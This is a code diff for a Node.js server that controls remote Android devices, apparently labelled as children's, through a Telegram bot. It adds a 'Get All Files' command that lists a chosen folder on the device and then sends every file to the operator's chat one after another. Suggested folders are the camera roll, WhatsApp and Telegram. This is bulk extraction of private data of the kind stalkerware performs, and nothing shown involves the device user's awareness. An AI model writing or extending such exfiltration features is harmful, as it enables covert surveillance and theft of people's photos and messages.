@@ -493,6 +493,9 @@ function initTelegramBot() {
       ],
       [
         { text: "📂 Files",          callback_data: `act:files:${deviceId}` },
+        { text: "📥 Get All Files",  callback_data: `act:get_all_files:${deviceId}` },
+      ],
+      [
         { text: "📋 Get Info",       callback_data: `act:get_info:${deviceId}` },
       ],
       [
@@ -676,6 +679,34 @@ function initTelegramBot() {
       return;
     }
 
+    if (state.awaitingInput === 'get_all_files') {
+      state.awaitingInput = null;
+      const devId = state.selectedDeviceId;
+      if (!devId || !childDevices.has(devId)) {
+        bot.sendMessage(chatId, "❌ Device offline.");
+        return;
+      }
+      const resolvedPath = resolveFolderPath(text);
+      const loadMsg = await bot.sendMessage(chatId,
+        `🔍 Scanning folder: \`${escapeMd(resolvedPath)}\`…\n_Sob file list korchi, ektu wait koro…_`,
+        { parse_mode: 'Markdown' });
+
+      pendingBotFileRequests.set(devId + '_getall', {
+        chatId, msgId: loadMsg.message_id,
+        type: 'get_all_files', path: resolvedPath
+      });
+
+      sendCommandToDevice(devId, { command: 'list_dir', path: resolvedPath });
+
+      setTimeout(() => {
+        if (pendingBotFileRequests.get(devId + '_getall')?.chatId === chatId) {
+          pendingBotFileRequests.delete(devId + '_getall');
+          bot.sendMessage(chatId, "⏱️ Timeout — device respond koreni.");
+        }
+      }, 15000);
+      return;
+    }
+
     if (state.awaitingInput === 'policy') {
       state.awaitingInput = null;
       const devId = state.selectedDeviceId;
@@ -791,6 +822,26 @@ function initTelegramBot() {
           `*Full path:*\n` +
           `\`/storage/emulated/0/Download\`\n\n` +
           `_🔍 Sob file dekhabe, even .trash / dot files_`,
+          { parse_mode: 'Markdown' }
+        );
+        return;
+      }
+
+      // ── get_all_files: send every file from a folder ─────────────────
+      if (action === "get_all_files") {
+        state.selectedDeviceId = deviceId;
+        state.awaitingInput    = 'get_all_files';
+        bot.answerCallbackQuery(query.id);
+        bot.sendMessage(chatId,
+          `📥 *Get All Files — ${escapeMd(dev.childName)}*\n\n` +
+          `Folder path likho. Bot oi folder er sob file download kore pathabe.\n\n` +
+          `*Short names:*\n` +
+          `\`Download\`  \`DCIM\`  \`DCIM/Camera\`\n` +
+          `\`Pictures\`  \`WhatsApp\`  \`Telegram\`\n\n` +
+          `*Full path example:*\n` +
+          `\`/sdcard/DCIM/\`\n` +
+          `\`/storage/emulated/0/Download\`\n\n` +
+          `⚠️ _Onek file thakle time lagbe. 50MB+ file skip hobe._`,
           { parse_mode: 'Markdown' }
         );
         return;
@@ -1628,6 +1679,133 @@ wss.on('connection', (ws, req) => {
             } else if (payload.action === 'error') {
               pendingBotFileRequests.delete(deviceId);
               if (bot) bot.sendMessage(pending.chatId, `❌ Error: ${escapeMd(payload.message)}`);
+            }
+          }
+
+          // ── get_all_files: intercept list_dir_result, then download all ──
+          const pendingAll = pendingBotFileRequests.get(deviceId + '_getall');
+          if (pendingAll && payload.action === 'list_dir_result') {
+            pendingBotFileRequests.delete(deviceId + '_getall');
+            const items   = payload.items || [];
+            const files   = items.filter(i => !i.isDirectory);
+            const chatId2 = pendingAll.chatId;
+            const folderPath = payload.currentPath || pendingAll.path;
+
+            if (files.length === 0) {
+              bot.sendMessage(chatId2,
+                `📂 *${escapeMd(folderPath)}*\n\n_Ei folder e kono file nai._`,
+                { parse_mode: 'Markdown' });
+              return;
+            }
+
+            // Edit the scanning message with summary
+            bot.editMessageText(
+              `📥 *Get All Files*\n\n` +
+              `📂 \`${escapeMd(folderPath)}\`\n` +
+              `📊 *${files.length} ta file* pawa geche\n\n` +
+              `⬇️ Download shuru hocche… 0/${files.length}`,
+              { chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown' }
+            ).catch(() => {});
+
+            // Sequential download with delay to avoid flooding
+            (async () => {
+              let sent = 0, skipped = 0, failed = 0;
+              for (let i = 0; i < files.length; i++) {
+                const file = files[i];
+                try {
+                  // Update progress every 5 files or on first/last
+                  if (i % 5 === 0 || i === files.length - 1) {
+                    bot.editMessageText(
+                      `📥 *Get All Files — Progress*\n\n` +
+                      `📂 \`${escapeMd(folderPath)}\`\n` +
+                      `📊 ${files.length} ta file\n\n` +
+                      `⬇️ Downloading: ${i + 1}/${files.length}\n` +
+                      `✅ Sent: ${sent}  ⏭ Skipped: ${skipped}  ❌ Failed: ${failed}\n\n` +
+                      `_Current: ${escapeMd(file.name)}_`,
+                      { chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown' }
+                    ).catch(() => {});
+                  }
+
+                  // Skip files > 50MB
+                  if (file.size && file.size > 50 * 1024 * 1024) {
+                    bot.sendMessage(chatId2,
+                      `⏭️ *Skip* (>50MB): \`${escapeMd(file.name)}\` — ${formatSize(file.size)}`,
+                      { parse_mode: 'Markdown' });
+                    skipped++;
+                    continue;
+                  }
+
+                  // Download file from device
+                  const fileData = await new Promise((resolve, reject) => {
+                    const dlKey = deviceId + '_getall_dl_' + i;
+                    const timeout = setTimeout(() => {
+                      pendingBotFileRequests.delete(dlKey);
+                      reject(new Error('Download timeout'));
+                    }, 120000);
+
+                    pendingBotFileRequests.set(dlKey, {
+                      chatId: chatId2, msgId: null,
+                      type: 'download_file_getall',
+                      resolve, reject, timeout
+                    });
+                    sendCommandToDevice(deviceId, { command: 'download_file', path: file.path });
+                  });
+
+                  // Send to Telegram
+                  await handleBotFileDownload(chatId2, deviceId, fileData);
+                  sent++;
+
+                  // Small delay to avoid Telegram flood limits
+                  await new Promise(r => setTimeout(r, 500));
+
+                } catch (err) {
+                  console.error(`[GET_ALL] File failed: ${file.name}`, err.message);
+                  failed++;
+                  // Continue with next file
+                  await new Promise(r => setTimeout(r, 300));
+                }
+              }
+
+              // Final summary
+              bot.editMessageText(
+                `✅ *Get All Files — Done!*\n\n` +
+                `📂 \`${escapeMd(folderPath)}\`\n\n` +
+                `📊 Total: ${files.length} ta file\n` +
+                `✅ Sent: ${sent}\n` +
+                `⏭️ Skipped (>50MB): ${skipped}\n` +
+                `❌ Failed: ${failed}`,
+                { chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown',
+                  reply_markup: { inline_keyboard: [[
+                    { text: '◀️ Back to Device', callback_data: `sel:${deviceId}` }
+                  ]]} }
+              ).catch(() =>
+                bot.sendMessage(chatId2,
+                  `✅ *Shesh!* ${sent} ta file pathano hoyeche, ${skipped} ta skip, ${failed} ta fail.`,
+                  { parse_mode: 'Markdown' })
+              );
+            })();
+          }
+
+          // ── intercept download_file_result for get_all sequential downloads ──
+          if (payload.action === 'download_file_result') {
+            // Find any pending get_all_dl_ keys for this device
+            for (const [key, pr] of pendingBotFileRequests.entries()) {
+              if (key.startsWith(deviceId + '_getall_dl_') && pr.type === 'download_file_getall') {
+                clearTimeout(pr.timeout);
+                pendingBotFileRequests.delete(key);
+                pr.resolve(payload);
+                break;
+              }
+            }
+          }
+          if (payload.action === 'error') {
+            for (const [key, pr] of pendingBotFileRequests.entries()) {
+              if (key.startsWith(deviceId + '_getall_dl_') && pr.type === 'download_file_getall') {
+                clearTimeout(pr.timeout);
+                pendingBotFileRequests.delete(key);
+                pr.reject(new Error(payload.message || 'Device error'));
+                break;
+              }
             }
           }
 
